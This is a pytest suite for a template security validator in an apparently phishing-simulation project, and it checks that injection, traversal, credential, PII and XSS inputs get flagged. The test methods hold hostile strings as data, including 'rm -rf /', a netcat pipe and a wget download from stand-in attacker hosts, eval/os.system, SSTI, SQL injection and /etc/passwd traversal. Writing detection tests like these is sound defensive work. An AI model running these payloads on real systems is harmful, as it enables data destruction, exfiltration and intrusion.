"""Comprehensive tests for Template Security Validator.

Tests cover all security categories including:
- Injection attacks (YAML, command, code, SQL)
- Path traversal
- Credential exposure
- Malicious URLs
- PII exposure
- Resource abuse
- Encoding attacks
- Content policy violations
- Schema security

Author: Olabisi Olajide (bayulus)
Issue: #74 - Implement Template Security Validation
Priority: Critical
"""

import pytest
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

from threatsimgpt.security.template_validator import (
    TemplateSecurityValidator,
    SecurityValidationResult,
    SecurityFinding,
    SecuritySeverity,
    SecurityCategory,
    validate_template_security,
)


# ============================================================================
# Test Fixtures
# ============================================================================

@pytest.fixture
def validator() -> TemplateSecurityValidator:
    """Create a default security validator instance."""
    return TemplateSecurityValidator(strict_mode=True)


@pytest.fixture
def lenient_validator() -> TemplateSecurityValidator:
    """Create a lenient security validator instance."""
    return TemplateSecurityValidator(
        strict_mode=False,
        allow_url_shorteners=True,
        allow_ip_urls=True,
    )


@pytest.fixture
def valid_template() -> Dict[str, Any]:
    """Create a valid template without security issues."""
    return {
        "metadata": {
            "name": "Test Phishing Campaign",
            "description": "A test template for security validation",
            "version": "1.0.0",
            "author": "Security Team",
            "created_at": "2026-01-16T10:00:00Z",
            "tags": ["test", "phishing"],
            "references": [
                "https://attack.mitre.org/techniques/T1566/001/"
            ]
        },
        "threat_type": "spear_phishing",
        "delivery_vector": "email",
        "target_profile": {
            "role": "Manager",
            "seniority": "mid",
            "department": "IT",
            "technical_level": "moderate",
            "industry": "technology",
            "company_size": "medium",
        },
        "behavioral_pattern": {
            "mitre_attack_techniques": ["T1566.001"],
            "psychological_triggers": ["urgency", "authority"],
            "social_engineering_tactics": ["pretexting"],
        },
        "difficulty_level": 5,
        "estimated_duration": 30,
        "simulation_parameters": {
            "max_iterations": 3,
            "max_duration_minutes": 60,
            "escalation_enabled": True,
            "response_adaptation": True,
            "language": "en",
            "tone": "professional",
            "urgency_level": 5,
        },
        "custom_parameters": {}
    }


# ============================================================================
# Basic Validation Tests
# ============================================================================

class TestBasicValidation:
    """Tests for basic validation functionality."""
    
    def test_valid_template_passes(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that a valid template passes security validation."""
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is True
        assert result.critical_count == 0
        assert result.high_count == 0
        assert len(result.blocking_findings) == 0
        assert result.template_hash is not None
        assert result.validation_id is not None
    
    def test_validation_returns_result_object(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that validation returns a proper result object."""
        result = validator.validate_template(valid_template)
        
        assert isinstance(result, SecurityValidationResult)
        assert isinstance(result.scan_timestamp, datetime)
        assert isinstance(result.scan_duration_ms, float)
        assert result.scan_duration_ms >= 0
    
    def test_empty_template(self, validator: TemplateSecurityValidator):
        """Test validation of an empty template."""
        result = validator.validate_template({})
        
        assert isinstance(result, SecurityValidationResult)
        # Empty template should pass but may have schema warnings
    
    def test_result_to_dict(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that result can be serialized to dictionary."""
        result = validator.validate_template(valid_template)
        result_dict = result.to_dict()
        
        assert "is_secure" in result_dict
        assert "validation_id" in result_dict
        assert "summary" in result_dict
        assert "findings" in result_dict


# ============================================================================
# YAML Injection Tests
# ============================================================================

class TestYAMLInjection:
    """Tests for YAML injection detection."""
    
    def test_python_object_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Python object deserialization attack."""
        valid_template["metadata"]["name"] = "Test !!python/object:os.system"
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is False
        assert any(f.category == SecurityCategory.YAML_SECURITY for f in result.findings)
    
    def test_ruby_object_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Ruby object deserialization attack."""
        valid_template["metadata"]["description"] = "Attack via !!ruby/object:Gem::Installer"
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is False
        assert any("Ruby" in f.title or "ruby" in f.description.lower() for f in result.findings)
    
    def test_yaml_anchor_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of YAML anchor-based attacks."""
        valid_template["custom_parameters"]["attack"] = "*alias_exploit"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.YAML_SECURITY for f in result.findings)
    
    def test_yaml_merge_key_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of YAML merge key attacks."""
        valid_template["custom_parameters"]["merge"] = "<<: *dangerous"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.YAML_SECURITY for f in result.findings)


# ============================================================================
# Command Injection Tests
# ============================================================================

class TestCommandInjection:
    """Tests for command injection detection."""
    
    def test_shell_command_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of shell command injection."""
        valid_template["metadata"]["name"] = "Test; rm -rf /"
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is False
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_backtick_command_substitution(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of backtick command substitution."""
        valid_template["custom_parameters"]["cmd"] = "`whoami`"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_dollar_command_substitution(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of $() command substitution."""
        valid_template["custom_parameters"]["cmd"] = "$(cat /etc/passwd)"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_pipe_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of pipe-based command injection."""
        valid_template["custom_parameters"]["input"] = "data | nc attacker.com 4444"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_wget_command(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of wget command in templates."""
        valid_template["custom_parameters"]["download"] = "wget -O /tmp/mal.sh http://evil.com/payload"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)


# ============================================================================
# Code Injection Tests
# ============================================================================

class TestCodeInjection:
    """Tests for code injection detection."""
    
    def test_python_eval_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Python eval() injection."""
        valid_template["custom_parameters"]["code"] = "eval('__import__(\"os\").system(\"id\")')"
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is False
        assert any(f.severity == SecuritySeverity.CRITICAL for f in result.findings)
    
    def test_python_exec_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Python exec() injection."""
        valid_template["custom_parameters"]["code"] = 'exec("import socket")'
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_python_import_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Python __import__() injection."""
        valid_template["custom_parameters"]["module"] = '__import__("subprocess")'
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_template_expression_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of template expression injection."""
        valid_template["custom_parameters"]["ssti"] = "{{config.items()}}"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_jinja_tag_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Jinja template tag injection."""
        valid_template["custom_parameters"]["jinja"] = "{% for x in [].__class__.__base__.__subclasses__() %}"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)


# ============================================================================
# SQL Injection Tests
# ============================================================================

class TestSQLInjection:
    """Tests for SQL injection detection."""
    
    def test_sql_or_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of SQL OR injection."""
        valid_template["custom_parameters"]["query"] = "' OR '1'='1"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_sql_union_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of SQL UNION injection."""
        valid_template["custom_parameters"]["data"] = "' UNION SELECT password FROM users--"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_sql_drop_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of SQL DROP injection."""
        valid_template["custom_parameters"]["input"] = "'; DROP TABLE users;--"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)


# ============================================================================
# Path Traversal Tests
# ============================================================================

class TestPathTraversal:
    """Tests for path traversal detection."""
    
    def test_parent_directory_traversal(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of parent directory traversal."""
        valid_template["custom_parameters"]["file"] = "../../../etc/passwd"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PATH_TRAVERSAL for f in result.findings)
    
    def test_windows_traversal(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Windows path traversal."""
        valid_template["custom_parameters"]["path"] = "..\\..\\..\\Windows\\System32\\config\\SAM"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PATH_TRAVERSAL for f in result.findings)
    
    def test_url_encoded_traversal(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of URL-encoded path traversal."""
        valid_template["custom_parameters"]["file"] = "%2e%2e/%2e%2e/etc/passwd"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PATH_TRAVERSAL for f in result.findings)
    
    def test_etc_passwd_access(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of /etc/passwd access attempt."""
        valid_template["custom_parameters"]["target"] = "/etc/passwd"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PATH_TRAVERSAL for f in result.findings)
    
    def test_file_protocol_url(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of file:// protocol URLs."""
        valid_template["custom_parameters"]["url"] = "file:///etc/passwd"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PATH_TRAVERSAL for f in result.findings)


# ============================================================================
# Credential Exposure Tests
# ============================================================================

class TestCredentialExposure:
    """Tests for credential and secret exposure detection."""
    
    def test_aws_access_key(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of AWS access key."""
        valid_template["custom_parameters"]["aws"] = "AKIAIOSFODNN7EXAMPLE"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_openai_api_key(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of OpenAI API key."""
        valid_template["custom_parameters"]["key"] = "sk-proj-abcdefghijklmnopqrstuvwxyz123456789012345678"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_github_token(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of GitHub personal access token."""
        valid_template["custom_parameters"]["token"] = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_database_connection_string(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of database connection string."""
        valid_template["custom_parameters"]["db"] = "postgres://admin:secretpassword@db.example.com/production"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_hardcoded_password(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of hardcoded password."""
        valid_template["custom_parameters"]["config"] = "password=SuperSecret123!"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_jwt_token(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of JWT bearer token."""
        valid_template["custom_parameters"]["auth"] = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_credential_detection_can_be_disabled(self, valid_template: Dict[str, Any]):
        """Test that credential detection can be disabled."""
        validator = TemplateSecurityValidator(
            strict_mode=True,
            enable_credential_detection=False,
        )
        valid_template["custom_parameters"]["key"] = "api_key=sk-verysecretkey123456789012345678901234567890"
        result = validator.validate_template(valid_template)
        
        assert not any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)


# ============================================================================
# Malicious URL Tests
# ============================================================================

class TestMaliciousURLs:
    """Tests for malicious URL detection."""
    
    def test_suspicious_tld(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of suspicious TLD."""
        valid_template["metadata"]["references"].append("https://malicious-site.xyz/payload")
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.MALICIOUS_URL for f in result.findings)
    
    def test_url_shortener(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of URL shorteners."""
        valid_template["custom_parameters"]["link"] = "https://bit.ly/malicious"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.MALICIOUS_URL for f in result.findings)
    
    def test_ip_based_url(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of IP-based URLs."""
        valid_template["custom_parameters"]["url"] = "http://192.168.1.100/admin"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.MALICIOUS_URL for f in result.findings)
    
    def test_javascript_url(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of javascript: URLs."""
        valid_template["custom_parameters"]["link"] = "javascript:alert('XSS')"
        result = validator.validate_template(valid_template)
        
        assert any(f.category in (SecurityCategory.MALICIOUS_URL, SecurityCategory.CONTENT_POLICY) 
                   for f in result.findings)
    
    def test_data_url_html(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of data: URLs with HTML content."""
        valid_template["custom_parameters"]["src"] = "data:text/html,<script>alert(1)</script>"
        result = validator.validate_template(valid_template)
        
        assert any(f.category in (SecurityCategory.MALICIOUS_URL, SecurityCategory.CONTENT_POLICY) 
                   for f in result.findings)
    
    def test_credentials_in_url(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of credentials embedded in URL."""
        valid_template["custom_parameters"]["url"] = "https://admin:password123@internal.company.com/"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_allowed_domain_passes(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that URLs from allowed domains pass validation."""
        valid_template["metadata"]["references"] = [
            "https://attack.mitre.org/techniques/T1566/001/",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            "https://owasp.org/www-project-top-ten/",
        ]
        result = validator.validate_template(valid_template)
        
        # Should not have high-severity URL findings for allowed domains
        url_findings = [f for f in result.findings if f.category == SecurityCategory.MALICIOUS_URL]
        high_severity_url_findings = [f for f in url_findings if f.severity in (SecuritySeverity.HIGH, SecuritySeverity.CRITICAL)]
        assert len(high_severity_url_findings) == 0


# ============================================================================
# PII Exposure Tests
# ============================================================================

class TestPIIExposure:
    """Tests for PII exposure detection."""
    
    def test_real_email_address(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of real email addresses."""
        valid_template["custom_parameters"]["contact"] = "john.doe@realcompany.com"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PII_EXPOSURE for f in result.findings)
    
    def test_example_email_passes(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that example.com emails pass validation."""
        valid_template["custom_parameters"]["contact"] = "user@example.com"
        result = validator.validate_template(valid_template)
        
        pii_findings = [f for f in result.findings if f.category == SecurityCategory.PII_EXPOSURE 
                        and "email" in f.title.lower()]
        assert len(pii_findings) == 0
    
    def test_ssn_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of Social Security Numbers."""
        valid_template["custom_parameters"]["ssn"] = "123-45-6789"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PII_EXPOSURE for f in result.findings)
    
    def test_credit_card_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of credit card numbers."""
        valid_template["custom_parameters"]["card"] = "4111111111111111"  # Test Visa number
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PII_EXPOSURE for f in result.findings)
    
    def test_phone_number_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of US phone numbers."""
        valid_template["custom_parameters"]["phone"] = "(555) 123-4567"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.PII_EXPOSURE for f in result.findings)
    
    def test_pii_detection_can_be_disabled(self, valid_template: Dict[str, Any]):
        """Test that PII detection can be disabled."""
        validator = TemplateSecurityValidator(
            strict_mode=True,
            enable_pii_detection=False,
        )
        valid_template["custom_parameters"]["ssn"] = "123-45-6789"
        result = validator.validate_template(valid_template)
        
        assert not any(f.category == SecurityCategory.PII_EXPOSURE for f in result.findings)


# ============================================================================
# Resource Abuse Tests
# ============================================================================

class TestResourceAbuse:
    """Tests for resource abuse detection."""
    
    def test_excessively_long_string(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of excessively long strings."""
        valid_template["metadata"]["description"] = "A" * 10000
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.RESOURCE_ABUSE for f in result.findings)
    
    def test_excessive_numeric_value(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of excessive numeric values."""
        valid_template["simulation_parameters"]["max_iterations"] = 1000
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.RESOURCE_ABUSE for f in result.findings)
    
    def test_deep_nesting(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of excessive nesting depth."""
        nested = {"level": 1}
        current = nested
        for i in range(20):
            current["nested"] = {"level": i + 2}
            current = current["nested"]
        
        valid_template["custom_parameters"]["deep"] = nested
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.RESOURCE_ABUSE for f in result.findings)
    
    def test_large_numeric_value(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of extremely large numbers."""
        valid_template["custom_parameters"]["bignum"] = "123456789012345678901234567890"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.RESOURCE_ABUSE for f in result.findings)


# ============================================================================
# Encoding Attack Tests
# ============================================================================

class TestEncodingAttacks:
    """Tests for encoding-based attack detection."""
    
    def test_null_byte_injection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of null byte injection."""
        valid_template["custom_parameters"]["file"] = "image.jpg\x00.php"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.ENCODING_ATTACK for f in result.findings)
    
    def test_control_character(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of control characters."""
        valid_template["custom_parameters"]["data"] = "test\x07data"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.ENCODING_ATTACK for f in result.findings)
    
    def test_url_encoded_null(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of URL-encoded null byte."""
        valid_template["custom_parameters"]["path"] = "file.txt%00.exe"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.ENCODING_ATTACK for f in result.findings)
    
    def test_utf7_encoded_tag(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of UTF-7 encoded HTML tag."""
        valid_template["custom_parameters"]["xss"] = "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.ENCODING_ATTACK for f in result.findings)


# ============================================================================
# Content Policy Tests
# ============================================================================

class TestContentPolicy:
    """Tests for content policy violation detection."""
    
    def test_script_tag_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of embedded script tags."""
        valid_template["custom_parameters"]["html"] = "<script>alert('XSS')</script>"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CONTENT_POLICY for f in result.findings)
    
    def test_iframe_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of embedded iframes."""
        valid_template["custom_parameters"]["embed"] = '<iframe src="https://malicious.com"></iframe>'
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CONTENT_POLICY for f in result.findings)
    
    def test_event_handler_detection(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of event handler attributes."""
        valid_template["custom_parameters"]["html"] = '<img src="x" onerror="alert(1)">'
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.CONTENT_POLICY for f in result.findings)


# ============================================================================
# Schema Security Tests
# ============================================================================

class TestSchemaSecurity:
    """Tests for schema-related security validation."""
    
    def test_unexpected_top_level_key(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of unexpected top-level keys."""
        valid_template["unexpected_key"] = "suspicious"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.SCHEMA_VIOLATION for f in result.findings)
    
    def test_suspicious_custom_parameter_key(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of suspicious custom parameter keys."""
        valid_template["custom_parameters"]["__import__"] = "os"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)
    
    def test_eval_in_key_name(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test detection of 'eval' in custom parameter key names."""
        valid_template["custom_parameters"]["eval_code"] = "print('test')"
        result = validator.validate_template(valid_template)
        
        assert any(f.category == SecurityCategory.INJECTION for f in result.findings)


# ============================================================================
# Sanitization Tests
# ============================================================================

class TestSanitization:
    """Tests for template sanitization functionality."""
    
    def test_sanitize_removes_null_bytes(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that sanitization removes null bytes."""
        valid_template["metadata"]["name"] = "Test\x00Name"
        sanitized, mods = validator.sanitize_template(valid_template)
        
        assert "\x00" not in sanitized["metadata"]["name"]
        assert len(mods) > 0
    
    def test_sanitize_removes_control_characters(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that sanitization removes control characters."""
        valid_template["metadata"]["description"] = "Test\x07Description"
        sanitized, mods = validator.sanitize_template(valid_template)
        
        assert "\x07" not in sanitized["metadata"]["description"]
    
    def test_sanitize_preserves_valid_content(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that sanitization preserves valid content."""
        sanitized, mods = validator.sanitize_template(valid_template)
        
        assert sanitized["metadata"]["name"] == valid_template["metadata"]["name"]
        assert len(mods) == 0  # No modifications needed for valid template


# ============================================================================
# Convenience Function Tests
# ============================================================================

class TestConvenienceFunction:
    """Tests for the validate_template_security convenience function."""
    
    def test_convenience_function_works(self, valid_template: Dict[str, Any]):
        """Test that the convenience function works correctly."""
        result = validate_template_security(valid_template, strict=True)
        
        assert isinstance(result, SecurityValidationResult)
        assert result.is_secure is True
    
    def test_convenience_function_strict_mode(self, valid_template: Dict[str, Any]):
        """Test strict mode in convenience function."""
        # Add a medium-severity issue
        valid_template["custom_parameters"]["data"] = "A" * 6000  # Exceeds default limit
        
        strict_result = validate_template_security(valid_template, strict=True)
        lenient_result = validate_template_security(valid_template, strict=False)
        
        # In strict mode, medium issues block
        assert strict_result.is_secure is False
        # In lenient mode, only high/critical block
        assert lenient_result.is_secure is True


# ============================================================================
# Integration Tests
# ============================================================================

class TestIntegration:
    """Integration tests with real template files."""
    
    def test_validate_yaml_string(self, validator: TemplateSecurityValidator):
        """Test validation of YAML string input."""
        yaml_content = """
metadata:
  name: Test Template
  description: A test template
  version: "1.0.0"
threat_type: phishing
delivery_vector: email
target_profile:
  role: Manager
  seniority: mid
  department: IT
  technical_level: moderate
behavioral_pattern:
  mitre_attack_techniques: ["T1566.001"]
difficulty_level: 5
estimated_duration: 30
simulation_parameters:
  max_iterations: 3
  language: en
custom_parameters: {}
"""
        result = validator.validate_template(yaml_content)
        
        assert isinstance(result, SecurityValidationResult)
    
    def test_multiple_issues_detected(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that multiple security issues are detected in one template."""
        # Add multiple issues
        valid_template["metadata"]["name"] = "Test; rm -rf /"  # Command injection
        valid_template["custom_parameters"]["key"] = "api_key=sk-secret12345678901234567890123456789012"  # Credential
        valid_template["custom_parameters"]["path"] = "../../../etc/passwd"  # Path traversal
        
        result = validator.validate_template(valid_template)
        
        assert result.is_secure is False
        assert len(result.findings) >= 3
        
        categories = {f.category for f in result.findings}
        assert SecurityCategory.INJECTION in categories
        assert SecurityCategory.CREDENTIAL_EXPOSURE in categories
        assert SecurityCategory.PATH_TRAVERSAL in categories


# ============================================================================
# Performance Tests
# ============================================================================

class TestPerformance:
    """Performance tests for security validation."""
    
    def test_validation_completes_quickly(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test that validation completes within reasonable time."""
        result = validator.validate_template(valid_template)
        
        # Validation should complete in under 100ms for normal templates
        assert result.scan_duration_ms < 100
    
    def test_large_template_handling(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of large templates."""
        # Add many custom parameters
        for i in range(100):
            valid_template["custom_parameters"][f"param_{i}"] = f"value_{i}" * 10
        
        result = validator.validate_template(valid_template)
        
        # Should still complete within reasonable time
        assert result.scan_duration_ms < 1000


# ============================================================================
# Edge Cases
# ============================================================================

class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""
    
    def test_unicode_content(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of Unicode content."""
        valid_template["metadata"]["name"] = "Test Template 日本語 🎯"
        result = validator.validate_template(valid_template)
        
        # Should handle Unicode gracefully
        assert isinstance(result, SecurityValidationResult)
    
    def test_empty_strings(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of empty strings."""
        valid_template["custom_parameters"]["empty"] = ""
        result = validator.validate_template(valid_template)
        
        assert isinstance(result, SecurityValidationResult)
    
    def test_boolean_values(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of boolean values."""
        valid_template["custom_parameters"]["flag"] = True
        result = validator.validate_template(valid_template)
        
        assert isinstance(result, SecurityValidationResult)
    
    def test_numeric_string_values(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of numeric string values."""
        valid_template["custom_parameters"]["number"] = "12345"
        result = validator.validate_template(valid_template)
        
        assert isinstance(result, SecurityValidationResult)
    
    def test_null_values(self, validator: TemplateSecurityValidator, valid_template: Dict[str, Any]):
        """Test handling of null/None values."""
        valid_template["custom_parameters"]["null_value"] = None
        result = validator.validate_template(valid_template)
        
        assert isinstance(result, SecurityValidationResult)
